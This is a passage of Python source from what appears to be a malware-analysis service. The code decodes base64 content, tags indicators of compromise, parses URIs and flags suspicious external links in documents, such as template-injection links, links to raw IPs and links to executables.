                sub_b64_res.add_subsection(dump_section)
            else:
                sub_b64_res.add_line(f"DECODED_FILE_DUMP: Possible base64 file contents were extracted. "
                                     f"See extracted file {sha256hash[0:10]}_b64_decoded")
            st_value = self.patterns.ioc_match(base64data, bogon_ip=True)
            for ty, val in st_value.items():
                for v in val:
                    sub_b64_res.add_tag(ty, v)

        if b64_ascii_content:
            all_b64 = b"\n".join(b64_ascii_content)
            b64_all_sha256 = hashlib.sha256(all_b64).hexdigest()
            self._extract_file(all_b64, f"b64_{b64_all_sha256}.txt", f"b64 for {dataname}")

        return b64_res if b64_res.subsections else None

    def parse_uri(self, check_uri: bytes) -> Tuple[bytes, str, bytes]:
        """Use regex to determine if URI valid and should be reported.

        Args:
            check_uri: Possible URI string.

        Returns:
            A tuple of:
            - The parsed uri,
            - the hostname tag type,
            - the hostname (either domain or ip address)

        If any of the return values aren't parsed they are left empty.
        """
        if isinstance(check_uri, str):
            check_uri = check_uri.encode('utf-8', errors='ignore')

        split = check_uri.split(maxsplit=1)
        if not split:
            return b'', '', b''
        try:
            url = urlparse(split[0])
        except ValueError as e:
            # Implies we're given an invalid link to parse
            if str(e) == 'Invalid IPv6 URL':
                return b'', '', b''
            else:
                raise e
        if not url.scheme or not url.hostname \
                or url.scheme == b'file' or not re.match(b'(?i)[a-z0-9.-]+', url.hostname):
            return b'', '', b''

        full_uri: bytes = url.geturl()
        if any(pattern in full_uri for pattern in self.pat_safelist):
            return b'', '', b''

        if re.match(self.IP_RE, url.hostname):
            if not is_ip_reserved(safe_str(url.hostname)):
                return full_uri, 'network.static.ip', url.hostname
        elif re.match(self.DOMAIN_RE, url.hostname):
            return full_uri, 'network.static.domain', url.hostname
        return full_uri, '', b''

    def _process_link(self, link_type: str, link: Union[str, bytes], heuristic: Heuristic, section: ResultSection) -> Heuristic:
        """
        Processes an external link to add the appropriate signatures to heuristic

        Args:
            link_type: The type of the link.
            link: The link text.
            heuristic: The heuristic to signature.
            section: The section for ioc tags

        Returns:
            The heuristic that was passed as an argument.
        """
        safe_link: bytes = safe_str(link).encode()
        if safe_link.startswith(b'mhtml:'):
            heuristic.add_signature_id('mhtml_link')
            # Get last url link
            safe_link = safe_link.rsplit(b'!x-usc:')[-1]
        url, hostname_type, hostname = self.parse_uri(safe_link)
        if url:
            heuristic.add_signature_id(link_type.lower())
            section.add_tag('network.static.uri', url)
            if link_type.lower() == 'attachedtemplate':
                heuristic.add_attack_id('T1221')
        if hostname:
            section.add_tag(hostname_type, hostname)
        if hostname_type == 'network.static.ip':
            heuristic.add_signature_id('external_link_ip')
        filename = os.path.basename(url).split(b'?')[0]
        if re.match(self.EXECUTABLE_EXTENSIONS_RE, os.path.splitext(filename)[1]) \
                and not filename in self.tag_safelist:
            heuristic.add_signature_id('link_to_executable')
            section.add_tag('file.name.extracted', filename)
        return heuristic
